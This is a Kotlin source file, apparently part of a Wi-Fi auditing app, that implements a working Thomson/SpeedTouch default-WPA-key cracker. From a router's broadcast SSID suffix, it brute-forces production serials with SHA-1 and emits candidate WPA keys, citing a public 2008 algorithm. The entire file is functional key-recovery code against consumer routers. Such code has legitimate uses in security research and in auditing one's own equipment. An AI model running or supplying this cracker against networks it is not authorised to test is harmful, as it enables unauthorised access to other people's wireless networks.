package com.wsvdmeer.pwncompanion.crack

import java.security.MessageDigest
import java.util.Locale

/**
 * Thomson / SpeedTouch default-WPA-key generator.
 *
 * These routers derive BOTH the SSID and the default WPA key from the unit serial via SHA-1: the
 * last 3 bytes of the digest become the SSID suffix (`SpeedTouchXXXXXX`) and the first 5 bytes
 * become the 10-hex-char WPA key. Knowing only the SSID suffix, brute-force the plausible serial
 * space, SHA-1 each, and emit the key of every serial whose digest reproduces the suffix.
 *
 * Serial → SHA-1 input is `"CP" + YY + WW + hexASCII(3-digit production)` — e.g. serial CP0615…109
 * becomes the ASCII string `"CP0615313039"`. (Public algorithm: Kevin Devine's `stkeys` /
 * GNUCitizen 2008; also implemented by the GPL RouterKeygen.) The SHA-1 math is pinned to the
 * canonical `SpeedTouchF8A3D0 → 742DA831D2` vector in KeyGeneratorTest.
 *
 * Only the SpeedTouch/Thomson serial format (2004–2016-ish, 3-digit production) is covered; that's
 * the common case and enough to derive the key for a large slice of these older units.
 */
object ThomsonKeygen : KeyGenerator {
    override val id = "thomson"

    // SSID families that use this exact algorithm (all a fixed prefix + 6 hex chars).
    private val prefixes = listOf("SpeedTouch", "Thomson")

    /** The 6-hex SSID suffix (uppercased) if [essid] is a Thomson/SpeedTouch default SSID, else null. */
    private fun suffixOf(essid: String): String? {
        for (p in prefixes) {
            if (essid.length == p.length + 6 && essid.startsWith(p, ignoreCase = true)) {
                val suf = essid.substring(p.length).uppercase(Locale.ROOT)
                if (suf.all { it in "0123456789ABCDEF" }) return suf
            }
        }
        return null
    }

    override fun matches(essid: String, bssid: String) = suffixOf(essid) != null

    override fun candidates(essid: String, bssid: String): List<String> {
        val target = suffixOf(essid) ?: return emptyList()
        // Target SSID suffix as 3 bytes (compared directly — far cheaper than hex-formatting each digest).
        val t0 = target.substring(0, 2).toInt(16)
        val t1 = target.substring(2, 4).toInt(16)
        val t2 = target.substring(4, 6).toInt(16)

        val md = MessageDigest.getInstance("SHA-1")
        val buf = ByteArray(12)                 // "CP" YY WW + 6-byte hexASCII(production)
        buf[0] = 'C'.code.toByte(); buf[1] = 'P'.code.toByte()
        val out = LinkedHashSet<String>(2)
        for (yy in 4..16) {
            buf[2] = ('0' + yy / 10).code.toByte(); buf[3] = ('0' + yy % 10).code.toByte()
            for (ww in 1..53) {
                buf[4] = ('0' + ww / 10).code.toByte(); buf[5] = ('0' + ww % 10).code.toByte()
                for (ppp in 0..999) {
                    // 3 decimal digits; each digit char c ('0'..'9') hex-encodes to "3c".
                    buf[6] = '3'.code.toByte(); buf[7] = ('0' + ppp / 100).code.toByte()
                    buf[8] = '3'.code.toByte(); buf[9] = ('0' + ppp / 10 % 10).code.toByte()
                    buf[10] = '3'.code.toByte(); buf[11] = ('0' + ppp % 10).code.toByte()
                    val h = md.digest(buf)      // digest() resets the instance each call
                    if ((h[17].toInt() and 0xff) == t0 &&
                        (h[18].toInt() and 0xff) == t1 &&
                        (h[19].toInt() and 0xff) == t2
                    ) {
                        out.add(
                            "%02X%02X%02X%02X%02X".format(
                                h[0].toInt() and 0xff, h[1].toInt() and 0xff, h[2].toInt() and 0xff,
                                h[3].toInt() and 0xff, h[4].toInt() and 0xff,
                            )
                        )
                    }
                }
            }
        }
        return out.toList()
    }
}
